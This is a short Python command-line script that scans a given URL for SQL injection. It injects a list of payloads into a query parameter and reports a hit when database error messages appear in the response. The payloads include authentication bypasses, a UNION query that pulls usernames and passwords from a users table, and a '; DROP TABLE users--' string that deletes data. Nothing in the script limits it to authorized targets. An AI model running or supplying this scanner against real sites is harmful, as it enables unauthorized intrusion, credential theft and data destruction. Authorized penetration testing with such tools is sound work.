import requests
import sys
import urllib.parse
import time

def test_sql_injection(url):
    # List of common SQL injection payloads (expanded)
    sql_payloads = [
        "' OR 1=1--", "' OR '1'='1", "' OR ''='", "' OR 1=1-- -", "'; DROP TABLE users--",
        "' OR 1=1#", "' OR 1=1/*", "' OR 1=1 LIMIT 1 --", "' UNION SELECT null, null--",
        "' UNION SELECT username, password FROM users--", "admin'--", "admin' #",
        "admin'/*", "' OR 1=2", "' OR 'a'='a", "' OR '1'='1' --", "' OR 'x'='x"
    ]

    # Common SQL error messages
    sql_errors = [
        "SQL syntax", "MySQL", "SQLServer", "PostgreSQL", "Oracle", "database error",
        "you have an error in your SQL syntax", "Warning: mysql_fetch", "Unclosed quotation mark",
        "quoted string not properly terminated"
    ]


    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
        'Content-Type': 'application/x-www-form-urlencoded'
    }


    vulnerable_payloads = []


    for payload in sql_payloads:

        injected_url = urllib.parse.urljoin(url, f"?input={urllib.parse.quote(payload)}")

        print(f"Testing payload: {payload}")
        try:

            response = requests.get(injected_url, headers=headers, timeout=5)


            for error in sql_errors:
                if error.lower() in response.text.lower():
                    print(f"\nVulnerable to SQL injection with payload: {payload}")
                    vulnerable_payloads.append(payload)


                    user_input = input("Continue testing? (y/n): ").strip().lower()
                    if user_input != 'y':
                        print("\nStopping the test.")
                        return

                    break

        except requests.exceptions.Timeout:
            print(f"Request to {injected_url} timed out.")
        except requests.exceptions.RequestException as e:
            print(f"Error occurred while testing {injected_url}: {str(e)}")

        # Wait briefly between tests to avoid overwhelming the server
        time.sleep(0.5)

    # Summary of results
    if vulnerable_payloads:
        print("\nVulnerable payloads detected:")
        for payload in vulnerable_payloads:
            print(f"  - {payload}")
    else:
        print("Not vulnerable to SQL injection")


if len(sys.argv) < 2:
    print("Usage: python script.py <url>")
    sys.exit(1)


url = sys.argv[1]


test_sql_injection(url)
